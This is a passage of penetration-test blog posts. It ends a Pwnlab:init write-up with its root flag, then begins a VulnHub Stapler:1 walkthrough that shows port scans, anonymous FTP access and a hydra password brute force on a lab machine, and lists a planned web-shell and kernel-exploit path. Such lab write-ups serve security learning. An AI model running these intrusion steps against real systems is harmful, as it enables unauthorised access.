</pre></td><td class='code'><pre><code class='bash'><span class='line'>&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;h1&gt;cd /root&lt;/h1&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;cd /root&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;h1&gt;ls -al&lt;/h1&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;ls -al
</span><span class='line'>total 20
</span><span class='line'>drwx<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;</span>  <span class="m">2</span> root root <span class="m">4096</span> Mar <span class="m">17</span> 15:17 .
</span><span class='line'>drwxr-xr-x <span class="m">21</span> root root <span class="m">4096</span> Mar <span class="m">17</span> 09:13 ..
</span><span class='line'>lrwxrwxrwx  <span class="m">1</span> root root    <span class="m">9</span> Mar <span class="m">17</span> 10:06 .bash_history -&gt; /dev/null
</span><span class='line'>-rw-r<span class="p">&amp;</span>ndash<span class="p">;</span>r<span class="p">&amp;</span>ndash<span class="p">;</span>  <span class="m">1</span> root root  <span class="m">570</span> Jan <span class="m">31</span>  <span class="m">2010</span> .bashrc
</span><span class='line'><span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;</span>-  <span class="m">1</span> root root <span class="m">1840</span> Mar <span class="m">17</span> 15:17 flag.txt
</span><span class='line'>lrwxrwxrwx  <span class="m">1</span> root root    <span class="m">9</span> Mar <span class="m">17</span> 13:10 messages.txt -&gt; /dev/null
</span><span class='line'>lrwxrwxrwx  <span class="m">1</span> root root    <span class="m">9</span> Mar <span class="m">17</span> 13:10 .mysql_history -&gt; /dev/null
</span><span class='line'>-rw-r<span class="p">&amp;</span>ndash<span class="p">;</span>r<span class="p">&amp;</span>ndash<span class="p">;</span>  <span class="m">1</span> root root  <span class="m">140</span> Nov <span class="m">19</span>  <span class="m">2007</span> .profile&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;h1&gt;cat flag.txt&lt;/h1&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;cat flag.txt
</span><span class='line'>.-<span class="o">=</span>~<span class="o">=</span>-.                                                                 .-<span class="o">=</span>~<span class="o">=</span>-.
</span><span class='line'><span class="o">(</span>&lt;strong&gt;  &lt;em&gt;<span class="o">)</span>-.&lt;/em&gt;.-<span class="o">=</span>-.&lt;em&gt;.-<span class="o">=</span>-.&lt;/em&gt;.-<span class="o">=</span>-.&lt;em&gt;.-<span class="o">=</span>-.&lt;/em&gt;.-<span class="o">=</span>-.&lt;em&gt;.-<span class="o">=</span>-.&lt;/em&gt;.-<span class="o">=</span>-.&lt;em&gt;.-<span class="o">=</span>-.&lt;/em&gt;.-<span class="o">=</span>-.&lt;em&gt;.-<span class="o">=</span>-.&lt;/em&gt;.-<span class="o">(</span>&lt;/strong&gt;  &lt;em&gt;<span class="o">)</span>
</span><span class='line'><span class="o">(</span>&lt;/em&gt; &lt;strong&gt;&lt;em&gt;<span class="o">)</span>  &lt;/em&gt;&lt;/strong&gt;&lt;strong&gt;                             _                            <span class="o">(</span>&lt;em&gt; &lt;/em&gt;&lt;/strong&gt;<span class="o">)</span>
</span><span class='line'><span class="o">(</span>&lt;strong&gt;  _<span class="o">)</span> /  &lt;/strong&gt; <span class="se">\ </span>                          <span class="p">|</span> <span class="p">|</span>                           <span class="o">(</span>&lt;strong&gt;  _<span class="o">)</span>
</span><span class='line'><span class="o">(</span> _ &lt;/strong&gt;<span class="o">)</span> <span class="p">|</span> /  <span class="se">\/</span> &lt;em&gt;&lt;strong&gt;  _ &lt;/strong&gt;   &lt;strong&gt; _ _ &lt;/strong&gt; __ &lt;/em&gt;<span class="p">|</span> <span class="p">|</span>&lt;em&gt; &lt;/em&gt;&lt;strong&gt;                      <span class="o">(</span> _ &lt;/strong&gt;<span class="o">)</span>
</span><span class='line'><span class="o">(</span>&lt;strong&gt;  &lt;em&gt;<span class="o">)</span> <span class="p">|</span> <span class="p">|</span>    / _ <span class="p">|</span> <span class="p">&amp;</span>lsquo<span class="p">;</span>&lt;/em&gt; <span class="se">\ </span>/ _&lt;code&gt;<span class="p">|</span> <span class="s1">&#39;__/ _&lt;/code&gt; | &lt;/strong&gt;/ &lt;strong&gt;|                     (&lt;/strong&gt;  &lt;em&gt;)</span>
</span><span class='line'><span class="s1">(&lt;/em&gt; &lt;strong&gt;&lt;em&gt;) | _&lt;/em&gt;/\ (&lt;em&gt;) | | | | (&lt;/em&gt;| | | | (&lt;em&gt;| | |&lt;/em&gt;_&lt;em&gt; \                     (&lt;/em&gt; &lt;/strong&gt;&lt;em&gt;)</span>
</span><span class='line'><span class="s1">(__  &lt;/em&gt;)  _&lt;em&gt;&lt;strong&gt;/_&lt;/strong&gt;/|&lt;/em&gt;| |&lt;em&gt;|_&lt;/em&gt;, |&lt;em&gt;|  _&lt;/em&gt;,&lt;em&gt;|_&lt;/em&gt;|&lt;em&gt;&lt;strong&gt;/                     (&lt;/strong&gt;  &lt;/em&gt;)</span>
</span><span class='line'><span class="s1">( _ &lt;strong&gt;)                     &lt;/strong&gt;/ |                                       ( _ &lt;strong&gt;)</span>
</span><span class='line'><span class="s1">(&lt;/strong&gt;  &lt;em&gt;)                    |&lt;/em&gt;&lt;strong&gt;/                                        (&lt;/strong&gt;  &lt;em&gt;)</span>
</span><span class='line'><span class="s1">(__  &lt;/em&gt;)                                                                 (&lt;strong&gt;  &lt;em&gt;)</span>
</span><span class='line'><span class="s1">(&lt;/em&gt; &lt;/strong&gt;&lt;em&gt;) If  you are  reading this,  means  that you have  break &#39;</span>init<span class="p">&amp;</span>rsquo<span class="p">;</span>  <span class="o">(</span>&lt;/em&gt; &lt;em&gt;&lt;strong&gt;<span class="o">)</span>
</span><span class='line'><span class="o">(</span> _ &lt;/strong&gt;<span class="o">)</span> Pwnlab.  I hope  you enjoyed  and thanks  <span class="k">for</span>  your <span class="nb">time </span>doing  <span class="o">(</span> _ &lt;strong&gt;<span class="o">)</span>
</span><span class='line'><span class="o">(</span>&lt;/strong&gt;  &lt;/em&gt;<span class="o">)</span> this challenge.                                                 <span class="o">(</span>&lt;strong&gt;  &lt;em&gt;<span class="o">)</span>
</span><span class='line'><span class="o">(</span>&lt;/em&gt; &lt;/strong&gt;&lt;em&gt;<span class="o">)</span>                                                                 <span class="o">(</span>&lt;/em&gt; &lt;em&gt;&lt;strong&gt;<span class="o">)</span>
</span><span class='line'><span class="o">(</span> _ &lt;/strong&gt;<span class="o">)</span> Please send me  your  feedback or your  writeup,  I will  love  <span class="o">(</span> _ &lt;strong&gt;<span class="o">)</span>
</span><span class='line'><span class="o">(</span>&lt;/strong&gt;  &lt;/em&gt;<span class="o">)</span> reading it                                                      <span class="o">(</span>&lt;strong&gt;  _<span class="o">)</span>
</span><span class='line'><span class="o">(</span>&lt;/strong&gt;  &lt;em&gt;<span class="o">)</span>                                                                 <span class="o">(</span>__  &lt;/em&gt;<span class="o">)</span>
</span><span class='line'><span class="o">(</span>&lt;strong&gt;  _<span class="o">)</span>                                             For sniferl4bs.com  <span class="o">(</span>&lt;/strong&gt;  &lt;em&gt;<span class="o">)</span>
</span><span class='line'><span class="o">(</span> _ &lt;strong&gt;<span class="o">)</span>                                &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;&amp;#109;&amp;#97;&amp;#105;&amp;#108;&amp;#116;&amp;#x6f;&amp;#58;&amp;#x63;&amp;#x6c;&amp;#97;&amp;#111;&amp;#114;&amp;#64;&amp;#x50;&amp;#x77;&amp;#110;&amp;#x4c;&amp;#x61;&amp;#x62;&amp;#x2e;&amp;#110;&amp;#x65;&amp;#116;&quot;</span>&gt;<span class="p">&amp;</span><span class="c">#x63;&amp;#108;&amp;#97;&amp;#111;&amp;#x72;&amp;#x40;&amp;#80;&amp;#x77;&amp;#x6e;&amp;#76;&amp;#x61;&amp;#x62;&amp;#x2e;&amp;#110;&amp;#x65;&amp;#116;&lt;/a&gt; - @Chronicoder  ( _ &lt;/strong&gt;)</span>
</span><span class='line'><span class="o">(</span>__  &lt;/em&gt;<span class="o">)</span>                                                                 <span class="o">(</span>&lt;strong&gt;  &lt;em&gt;<span class="o">)</span>
</span><span class='line'><span class="o">(</span>&lt;/em&gt; &lt;/strong&gt;&lt;em&gt;<span class="o">)</span>-.&lt;/em&gt;.-<span class="o">=</span>-.&lt;em&gt;.-<span class="o">=</span>-.&lt;/em&gt;.-<span class="o">=</span>-.&lt;em&gt;.-<span class="o">=</span>-.&lt;/em&gt;.-<span class="o">=</span>-.&lt;em&gt;.-<span class="o">=</span>-.&lt;/em&gt;.-<span class="o">=</span>-.&lt;em&gt;.-<span class="o">=</span>-.&lt;/em&gt;.-<span class="o">=</span>-.&lt;em&gt;.-<span class="o">=</span>-.&lt;/em&gt;.-<span class="o">(</span>&lt;em&gt; &lt;/em&gt;&lt;em&gt;_<span class="o">)</span>
</span><span class='line'>&lt;code&gt;-._.-<span class="s1">&#39;                                                                &lt;/code&gt;-.&lt;/em&gt;.-&#39;</span>&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;h1&gt;&lt;/h1&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;
</span></code></pre></td></tr></table></div></figure></p>

<!--- Reference -->



]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[[VulnHub] Stapler: 1]]></title>
    <link href="http://f4l13n5n0w.github.io/blog/2016/08/15/vulnhub-stapler-1/"/>
    <updated>2016-08-15T21:21:02+10:00</updated>
    <id>http://f4l13n5n0w.github.io/blog/2016/08/15/vulnhub-stapler-1</id>
    <content type="html"><![CDATA[<p>This is made for BsidesLondon 2016 with average beginner/intermediate difficulty and a few twists :) Also multiple attacking vectors and paths to get shell and ROOT. Author is <a href="https://www.vulnhub.com/author/g0tmi1k,21/">g0tmi1k</a></p>

<p>More information and OVA file download please check <a href="https://www.vulnhub.com/entry/stapler-1,150/">here</a>.</p>

<!-- more -->


<h2>Attacker &amp; Target</h2>

<p>Attacker: Kali2 Linux (<em>10.1.1.132/24</em>)</p>

<p>Target: Stapler: 1 (<em>10.1.1.138/24</em>)</p>

<h2>Vulnerability &amp; Exploit</h2>

<ul>
<li>FTP service allow Anonymous login</li>
<li><code>WordPress</code> username and password bruteforce attack</li>
<li>WEB application Full Path Disclosure</li>
<li><a href="https://www.exploit-db.com/exploits/39646/" title="WordPress Advanced Video Plugin 1.0 - Local File Inclusion">WordPress Advanced Video Plugin 1.0 - Local File Inclusion</a></li>
<li><a href="https://www.exploit-db.com/exploits/39772/" title="Linux Kernel 4.4.x (Ubuntu 16.04) - 'double-fdput()' in bpf(BPF_PROG_LOAD) Local Root Exploit">Linux Kernel 4.4.x (Ubuntu 16.04) - &lsquo;double-fdput()&rsquo; in bpf(BPF_PROG_LOAD) Local Root Exploit</a></li>
</ul>


<h2>Method</h2>

<ul>
<li>Scanned the network to discover the target server [<font color="FF8000">arp-scan</font>]</li>
<li>Port scanned the target to discover running services and open ports [<font color="FF8000">masscan</font> &amp;&amp; <font color="FF8000">nmap</font>]</li>
<li>Web application scanned to dig more information about web service [<font color="FF8000">nikto</font>]</li>
<li>Scan specific vulnerability for WordPress CMS [<font color="FF8000">wpscan</font>]</li>
<li>Exploit WordPress plugin LFI vulnerability to read sensitive informtion</li>
<li>Connect to target server&rsquo;s MySQL service as root and write reverse PHP web shell</li>
<li>Connect to target server&rsquo;s MySQL service and download <code>wp_users</code> table which username and password hash saved in</li>
<li>Crack WordPress administrator/editor account and login to upload webshell [<font color="FF8000">php-reverse-shell</font>]</li>
<li>Enumeration and exploit the local priviledge vulnerability to get ROOT</li>
</ul>


<h2>Tools</h2>

<p>All the tools used here can be found in Kali Linux</p>

<ul>
<li><a href="http://linux.die.net/man/1/arp-scan">arp-scan</a></li>
<li><a href="https://github.com/robertdavidgraham/masscan">masscan</a></li>
<li><a href="https://nmap.org/">nmap</a></li>
<li><a href="https://cirt.net/Nikto2">nikto</a></li>
<li><a href="https://wpscan.org/">wpscan</a></li>
<li><a href="http://sqlmap.org/">sqlmap</a></li>
<li><a href="http://linux.die.net/man/1/nc">nc</a></li>
<li><a href="https://www.mozilla.org/en-US/firefox/new/">firefox</a></li>
<li><a href="https://portswigger.net/burp/">burp suite</a></li>
<li><a href="http://pentestmonkey.net/tools/web-shells/php-reverse-shell">php-reverse-shell</a></li>
</ul>


<h2>Walkthrough</h2>

<p>Using <code>arp-scan</code> as routine to detect the target&rsquo;s IP address.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/myExercises/stapler# arp-scan -l
</span><span class='line'>Interface: eth0, datalink <span class="nb">type</span>: EN10MB <span class="o">(</span>Ethernet<span class="o">)</span>
</span><span class='line'>Starting arp-scan 1.9 with <span class="m">256</span> hosts <span class="o">(</span>&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;http://www.nta-monitor.com/tools/arp-scan/&quot;</span>&gt;http://www.nta-monitor.com/tools/arp-scan/&lt;/a&gt;<span class="o">)</span>
</span><span class='line'>10.1.1.1    00:50:56:c0:00:08   VMware, Inc.
</span><span class='line'>10.1.1.2    00:50:56:f1:61:7e   VMware, Inc.
</span><span class='line'>10.1.1.138  00:0c:29:b4:04:59   VMware, Inc.
</span><span class='line'>10.1.1.254  00:50:56:e8:0a:52   VMware, Inc.&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;4 packets received by filter, <span class="m">0</span> packets dropped by kernel
</span><span class='line'>Ending arp-scan 1.9: <span class="m">256</span> hosts scanned in 2.283 seconds <span class="o">(</span>112.13 hosts/sec<span class="o">)</span>. <span class="m">4</span> responded
</span></code></pre></td></tr></table></div></figure></p>

<p><code>10.1.1.138</code> is our Target!</p>

<p>Then run <code>masscan</code> to detect opening ports on the target (masscan is much faster than nmap when doing a full ports scan, so here I use it to make a full scan and then use nmap to do a deep scan on target ports).</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/myExercises/stapler# masscan -p1-65535 10.1.1.138/32 <span class="p">&amp;</span>ndash<span class="p">;</span><span class="nv">rate</span><span class="o">=</span><span class="m">10000</span> <span class="p">|</span> cut -d <span class="p">&amp;</span>lsquo<span class="p">;</span> <span class="p">&amp;</span>rsquo<span class="p">;</span> -f <span class="m">4</span> <span class="p">|</span> cut -d <span class="p">&amp;</span>lsquo<span class="p">;</span>/<span class="p">&amp;</span>rsquo<span class="p">;</span> -f <span class="m">1</span> <span class="p">|</span> tee 138_masscan.txt&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;Starting masscan 1.0.3 <span class="o">(</span>&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;http://bit.ly/14GZzcT&quot;</span>&gt;http://bit.ly/14GZzcT&lt;/a&gt;<span class="o">)</span> at 2016-08-12 11:19:28 GMT
</span><span class='line'> <span class="p">&amp;</span>ndash<span class="p">;</span> forced options: -sS -Pn -n <span class="p">&amp;</span>ndash<span class="p">;</span>randomize-hosts -v <span class="p">&amp;</span>ndash<span class="p">;</span>send-eth
</span><span class='line'>Initiating SYN Stealth Scan
</span><span class='line'>Scanning <span class="m">1</span> hosts <span class="o">[</span><span class="m">65535</span> ports/host<span class="o">]</span>
</span><span class='line'><span class="m">12380</span>                                                                      &lt;br/&gt;
</span><span class='line'>22
</span><span class='line'>21
</span><span class='line'>53
</span><span class='line'>3306
</span><span class='line'>666
</span><span class='line'>80&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;root@kali:~/myExercises/stapler# tr <span class="p">&amp;</span>lsquo<span class="p">;</span><span class="se">\n</span><span class="p">&amp;</span>rsquo<span class="p">;</span> <span class="p">&amp;</span>lsquo<span class="p">;</span>,<span class="p">&amp;</span>rsquo<span class="p">;</span> <span class="p">&amp;</span>lt<span class="p">;</span> 138_masscan.txt
</span><span class='line'>12380,22,21,53,3306,666,80,root@kali:~/myExercises/stapler#   &lt;br/&gt;
</span></code></pre></td></tr></table></div></figure></p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="p">&amp;</span>hellip<span class="p">;</span>truncated<span class="p">&amp;</span>hellip<span class="p">;</span>
</span><span class='line'>Nmap scan report <span class="k">for</span> 10.1.1.138
</span><span class='line'>Host is up <span class="o">(</span>0.00044s latency<span class="o">)</span>.
</span><span class='line'>PORT      STATE SERVICE VERSION
</span><span class='line'>21/tcp    open  ftp     vsftpd 2.0.8 or later
</span><span class='line'><span class="p">|</span> ftp-anon: Anonymous FTP login allowed <span class="o">(</span>FTP code 230<span class="o">)</span>
</span><span class='line'><span class="p">|</span>&lt;em&gt;Can<span class="p">&amp;</span>rsquo<span class="p">;</span>t get directory listing: Can<span class="p">&amp;</span>rsquo<span class="p">;</span>t parse PASV response: <span class="p">&amp;</span>ldquo<span class="p">;</span>Permission denied.<span class="p">&amp;</span>rdquo<span class="p">;</span>
</span><span class='line'>22/tcp    open  ssh     OpenSSH 7.2p2 Ubuntu <span class="m">4</span> <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
</span><span class='line'><span class="p">|</span> ssh-hostkey:
</span><span class='line'><span class="p">|</span>   <span class="m">2048</span> 81:21:ce:a1:1a:05:b1:69:4f:4d:ed:80:28:e8:99:05 <span class="o">(</span>RSA<span class="o">)</span>
</span><span class='line'><span class="p">|</span>&lt;/em&gt;  <span class="m">256</span> 5b:a5:bb:67:91:1a:51:c2:d3:21:da:c0:ca:f0:db:9e <span class="o">(</span>ECDSA<span class="o">)</span>
</span><span class='line'>53/tcp    open  domain  dnsmasq 2.75
</span><span class='line'><span class="p">|</span> dns-nsid:
</span><span class='line'><span class="p">|</span>&lt;em&gt;  bind.version: dnsmasq-2.75
</span><span class='line'>80/tcp    open  http
</span><span class='line'><span class="p">|</span> http-methods:
</span><span class='line'><span class="p">|</span>&lt;/em&gt;  Supported Methods: GET HEAD POST OPTIONS
</span><span class='line'><span class="p">|</span>&lt;em&gt;http-title: <span class="m">404</span> Not Found
</span><span class='line'>666/tcp   open  doom?
</span><span class='line'>3306/tcp  open  mysql   MySQL 5.7.13-0ubuntu0.16.04.2
</span><span class='line'><span class="p">|</span> mysql-info:
</span><span class='line'><span class="p">|</span>   Protocol: 53
</span><span class='line'><span class="p">|</span>   Version: .7.13-0ubuntu0.16.04.2
</span><span class='line'><span class="p">|</span>   Thread ID: 8440
</span><span class='line'><span class="p">|</span>   Capabilities flags: 63487
</span><span class='line'><span class="p">|</span>   Some Capabilities: LongPassword, SupportsTransactions, IgnoreSigpipes, ConnectWithDatabase, DontAllowDatabaseTableColumn, Speaks41ProtocolOld, Support41Auth, ODBCClient, InteractiveClient, SupportsLoadDataLocal, IgnoreSpaceBeforeParenthesis, Speaks41ProtocolNew, LongColumnFlag, SupportsCompression, FoundRows
</span><span class='line'><span class="p">|</span>   Status: Autocommit
</span><span class='line'><span class="p">|</span>&lt;/em&gt;  Salt: <span class="p">&amp;</span>lsquo<span class="p">;</span>pw<span class="p">|</span><span class="o">)</span><span class="se">\x</span>07ib<span class="se">\x</span>0ByIS3P<span class="p">&amp;</span>lt<span class="p">;</span>Y&lt;sup&gt;jO&lt;/sup&gt;<span class="se">\x</span>10
</span><span class='line'>12380/tcp open  http    Apache httpd 2.4.18 <span class="o">((</span>Ubuntu<span class="o">))</span>
</span><span class='line'><span class="p">|</span> http-methods:
</span><span class='line'><span class="p">|</span>&lt;em&gt;  Supported Methods: GET HEAD POST OPTIONS
</span><span class='line'><span class="p">|</span>&lt;/em&gt;http-server-header: Apache/2.4.18 <span class="o">(</span>Ubuntu<span class="o">)</span>
</span><span class='line'><span class="p">|</span>_http-title: Site doesn<span class="p">&amp;</span>rsquo<span class="p">;</span>t have a title <span class="o">(</span>text/html<span class="o">)</span>.
</span><span class='line'><span class="p">&amp;</span>hellip<span class="p">;</span>truncated<span class="p">&amp;</span>hellip<span class="p">;</span>
</span></code></pre></td></tr></table></div></figure></p>

<p>Based on the result of NMAP scan, firstly, I found FTP port 21 is open and Anonymous login allowed. So I connected to the FTP server and found a file <code>note</code>:</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/myExercises/stapler# ftp 10.1.1.138
</span><span class='line'>Connected to 10.1.1.138.
</span><span class='line'>220-
</span><span class='line'>220-<span class="p">|&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>ndash<span class="p">;|</span>
</span><span class='line'>220-<span class="p">|</span> Harry, make sure to update the banner when you get a chance to show who has access here <span class="p">|</span>
</span><span class='line'>220-<span class="p">|&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>ndash<span class="p">;|</span>
</span><span class='line'>220-
</span><span class='line'>220
</span><span class='line'>Name <span class="o">(</span>10.1.1.138:root<span class="o">)</span>: anonymous
</span><span class='line'><span class="m">331</span> Please specify the password.
</span><span class='line'>Password:
</span><span class='line'><span class="m">230</span> Login successful.
</span><span class='line'>Remote system <span class="nb">type </span>is UNIX.
</span><span class='line'>Using binary mode to transfer files.
</span><span class='line'>ftp&gt;
</span><span class='line'>ftp&gt; ls
</span><span class='line'><span class="m">200</span> PORT <span class="nb">command </span>successful. Consider using PASV.
</span><span class='line'><span class="m">150</span> Here comes the directory listing.
</span><span class='line'>-rw-r<span class="p">&amp;</span>ndash<span class="p">;</span>r<span class="p">&amp;</span>ndash<span class="p">;</span>    <span class="m">1</span> <span class="m">0</span>        <span class="m">0</span>             <span class="m">107</span> Jun <span class="m">03</span> 23:06 note
</span><span class='line'><span class="m">226</span> Directory send OK.
</span><span class='line'>ftp&gt; get note
</span><span class='line'><span class="nb">local</span>: note remote: note
</span><span class='line'><span class="m">200</span> PORT <span class="nb">command </span>successful. Consider using PASV.
</span><span class='line'><span class="m">150</span> Opening BINARY mode data connection <span class="k">for</span> note <span class="o">(</span><span class="m">107</span> bytes<span class="o">)</span>.
</span><span class='line'><span class="m">226</span> Transfer complete.
</span><span class='line'><span class="m">107</span> bytes received in 0.01 secs <span class="o">(</span>14.1935 kB/s<span class="o">)</span>
</span><span class='line'>ftp&gt;&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;root@kali:~/myExercises/stapler# cat note
</span><span class='line'>Elly, make sure you update the payload information. Leave it in your FTP account once your are <span class="k">done</span>, John.
</span><span class='line'>root@kali:~/myExercises/stapler#
</span></code></pre></td></tr></table></div></figure></p>

<p>From the <code>note</code> file, I know that <code>elly</code> is a ftp user and there could be something about payload stored in her FTP folder.</p>

<p>Then I did a quick FTP login brute force attack against to user <code>elly</code> by using <code>hydra</code> with parameter <code>-e nsr</code>.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/myExercises/stapler# hydra -l elly -e nsr &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;ftp://10.1.1.138&quot;</span>&gt;ftp://10.1.1.138&lt;/a&gt;
</span><span class='line'>Hydra v8.2 <span class="p">&amp;</span>copy<span class="p">;</span> <span class="m">2016</span> by van Hauser/THC - Please <span class="k">do</span> not use in military or secret service organizations, or <span class="k">for</span> illegal purposes.&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;Hydra <span class="o">(</span>&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;http://www.thc.org/thc-hydra&quot;</span>&gt;http://www.thc.org/thc-hydra&lt;/a&gt;<span class="o">)</span> starting at 2016-08-15 22:56:07
</span><span class='line'><span class="o">[</span>DATA<span class="o">]</span> max <span class="m">3</span> tasks per <span class="m">1</span> server, overall <span class="m">64</span> tasks, <span class="m">3</span> login tries <span class="o">(</span>l:1/p:3<span class="o">)</span>, ~0 tries per task
</span><span class='line'><span class="o">[</span>DATA<span class="o">]</span> attacking service ftp on port 21
</span><span class='line'><span class="o">[</span>21<span class="o">][</span>ftp<span class="o">]</span> host: 10.1.1.138   login: elly   password: ylle
</span><span class='line'><span class="m">1</span> of <span class="m">1</span> target successfully completed, <span class="m">1</span> valid password found
</span><span class='line'>Hydra <span class="o">(</span>&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;http://www.thc.org/thc-hydra&quot;</span>&gt;http://www.thc.org/thc-hydra&lt;/a&gt;<span class="o">)</span> finished at 2016-08-15 22:56:11
</span></code></pre></td></tr></table></div></figure></p>

<p>Great! <code>elly</code>&rsquo;s password is <font color="red"><code>ylle</code></font></p>

<p>Login as <code>elly</code> and found that the home directory is <code>/etc/</code>, so I downloaded the file <code>passwd</code> and <code>vsftpd.conf</code>.</p>

<p>So far, nothing else found, so I decided to move on.</p>

<p>port 12380 is open and running HTTP with SSL. so I did a <code>nikto</code> scan against port 12380</p>

